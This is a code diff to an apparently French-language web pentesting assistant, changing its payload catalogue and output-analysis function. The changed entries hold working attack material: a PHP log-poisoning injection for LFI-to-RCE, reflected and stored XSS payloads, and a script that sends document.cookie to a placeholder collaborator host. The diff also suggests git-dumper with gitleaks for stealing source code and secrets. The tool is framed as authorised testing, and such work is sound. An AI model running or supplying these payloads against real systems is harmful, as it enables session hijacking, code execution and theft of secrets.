@@ -288,9 +288,9 @@ lfi:[
  {t:"LFI → RCE (log poisoning)", c:`# 1) injecter du PHP dans un log via User-Agent\ncurl -s -A "<?php system(\\$_GET[c]); ?>" ${U}/\n# 2) inclure le log\ncurl -s "${U}/?${P}=/var/log/apache2/access.log&c=id"`, e:`Transforme la LFI en exécution de commande.`}
 ],
 xss:[
- {t:"XSS réfléchie", c:`# ouvre dans le navigateur :\n${U}/?${P}=<script>alert(document.domain)<\/script>\n${U}/?${P}="><img src=x onerror=alert(1)>`, e:`Popup = XSS. Adapte au contexte (attribut, JS, HTML). Teste l'encodage.`},
- {t:"XSS stockée", c:`# injecte dans un champ persistant (profil, commentaire, nom) :\n"><svg onload=alert(document.domain)>`, e:`Si ça s'exécute chez un AUTRE utilisateur (ou au rechargement) → stockée = plus grave.`},
- {t:"Preuve d'impact (vol de session)", c:`# PoC non destructif : montrer document.cookie côté attaquant\n<script>new Image().src='//TON-COLLABORATOR/?c='+document.cookie<\/script>`, e:`Démontre l'impact réel (exfiltration de session) sans nuire aux utilisateurs.`}
+ {t:"XSS réfléchie — test AUTO (Kali) puis preuve (navigateur)", c:`# 1) Test AUTO dans Kali : la charge est-elle RENVOYÉE sans être échappée ?\ncurl -s '${U}/?${P}=<svg/onload=alert(1337)>' | grep -F '<svg/onload=alert(1337)>'\n# → une ligne ressort telle quelle = réfléchie (rien / &lt;svg = échappé = bon point)\n# 2) Preuve visuelle : ouvre cette URL DANS LE NAVIGATEUR (popup attendue) :\n# ${U}/?${P}=<svg/onload=alert(document.domain)>`, e:`Colle la sortie du grep → ▶ Analyser. La popup dans le navigateur = preuve finale. ⚠️ Les charges XSS se testent DANS LE NAVIGATEUR ou via curl entre apostrophes ' ' — JAMAIS collées telles quelles dans zsh (le "> casse le shell → dquote>).`},
+ {t:"XSS stockée — DANS LE NAVIGATEUR (pas dans Kali)", c:`# ⚠️ À coller DANS UN FORMULAIRE DU SITE (commentaire, profil, nom), PAS dans le terminal.\n# Colle cette charge dans le champ, enregistre, puis RECHARGE la page :\n<svg onload=alert(document.domain)>\n# Vérif AUTO (Kali) : la charge est-elle stockée en clair dans la page ?\ncurl -s '${U}/LA-PAGE-QUI-REAFFICHE' | grep -F '<svg onload=alert'`, e:`Popup au rechargement / chez un AUTRE utilisateur = XSS STOCKÉE (plus grave). Colle la sortie du grep → ▶ Analyser.`},
+ {t:"Preuve d'impact (vol de session) — navigateur", c:`# PoC non destructif, À COLLER DANS LE NAVIGATEUR (champ vulnérable), pas dans zsh :\n<script>new Image().src='//TON-COLLABORATOR/?c='+document.cookie<\/script>`, e:`Démontre l'exfiltration de session (vers TON Burp Collaborator) sans nuire aux utilisateurs.`}
 ],
 idor:[
  {t:"Repérer un identifiant", c:`# connecté au COMPTE A, note un ID d'objet (facture, message, RDV)\ncurl -s -b "cookieA" "${U}/api/object/1001"`, e:`ID séquentiel = candidat parfait. UUID = tester quand même (parfois devinables/leakés).`},
@@ -782,6 +782,21 @@ function scan(t){
   if(/ref:\s*refs\/heads|\.git\/HEAD[\s\S]{0,40}\b200\b|\b200\b[\s\S]{0,40}\.git/i.test(t)) return {cls:'ok',msg:'📂 Dépôt .git EXPOSÉ → récupération du code source + secrets.',
     follow:[{t:'Aspirer le .git + chercher des secrets',c:'git-dumper '+U+'/.git/ ./loot && gitleaks detect -s ./loot',e:'Sous mandat ; au coffre, ne pas diffuser le code.'}],
     report:{type:'info'}, unlock:null};
+  // ===== XSS : la charge injectée est-elle RENVOYÉE/EXÉCUTÉE (non échappée) ? =====
+  // Charge BRUTE (vrai < non encodé) dans la sortie = le navigateur l'exécute = XSS confirmée.
+  var xssRaw = /<svg[\s\/][^>]*onload\s*=|<script>\s*alert|<img[^>]*onerror\s*=|"><\s*(svg|script|img)\b/i;
+  if(xssRaw.test(raw)){
+    var xStored = /"><\s*(svg|img|script)|<svg\s+onload|<img\s+[^>]*onerror|stock|persist|commentaire|rechargement|autre utilisateur/i.test(raw);
+    var xRefl   = /<svg\/onload|[?&][a-z0-9_]+=<\s*(svg|script|img)/i.test(raw);
+    var xType = (xRefl && !xStored) ? 'xssr' : 'xss';
+    return {cls:'bad',msg:'🩹 XSS '+(xType==='xss'?'STOCKÉE':'RÉFLÉCHIE')+' CONFIRMÉE — ta charge est renvoyée dans la page SANS être échappée → le navigateur l\'exécute (popup). '+(xType==='xss'?'Persistante = elle touche les AUTRES visiteurs/admins = plus grave.':'Dans l\'URL/le paramètre : un lien piégé exécute du code chez la victime.')+' Preuve ajoutée au rapport.',
+      follow:[{t:'Preuve d\'impact (vol de session, PoC non destructif) — navigateur',c:'<script>new Image().src=\'//TON-COLLABORATOR/?c=\'+document.cookie<\/script>',e:'À coller DANS LE NAVIGATEUR (champ vulnérable). Montre l\'exfiltration de session vers TON Burp Collaborator, sans nuire aux utilisateurs. Impact réel pour le rapport.'}],
+      report:{type:xType}, unlock:null};
+  }
+  // Charge XSS ressortie ÉCHAPPÉE (&lt;svg / %3Cscript / entités) = le site encode = PAS de XSS (bon point).
+  if(/(&lt;|&#x?0*3c;?|%3c)\s*\/?\s*(svg|script|img)/i.test(raw) && /onerror|onload|alert\s*\(|document\.cookie/i.test(raw)){
+    return {cls:'ok',msg:'🛡️ Ta charge XSS ressort ÉCHAPPÉE (&lt;svg…, %3Cscript…) → le site encode la sortie = PAS de XSS exploitable ici. Bon point à noter au rapport.',follow:[],report:null,unlock:null};
+  }
   // Sortie du TEST DE MOT DE PASSE (wpscan --passwords) — TERMINAL, ne reboucle JAMAIS
   if(/No Valid Passwords Found|Valid Combinations Found|password attack|performing password|trying [0-9]|\[SUCCESS\]|rockyou/i.test(t)){
     if(/Valid Combinations Found|\[SUCCESS\]|Username:\s*\S+,?\s*Password:/i.test(t)){
